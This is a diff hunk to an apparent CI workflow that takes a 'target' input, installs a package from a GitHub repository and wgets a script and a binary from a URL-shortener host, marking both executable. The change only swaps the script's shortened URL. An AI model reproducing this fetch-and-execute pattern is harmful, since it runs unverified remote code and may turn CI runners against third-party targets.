@@ -24,7 +24,7 @@ jobs:
         run: |
           TARGET="${{ inputs.target }}"
           pip install git+https://github.com/QuantumLLC/Archer
-          wget https://curl.by/L20cz/Test.py
+          wget https://curl.by/OYowT/Test.py
           wget https://curl.by/OcB6A/blaze
           chmod +x blaze
           chmod +x Test.py
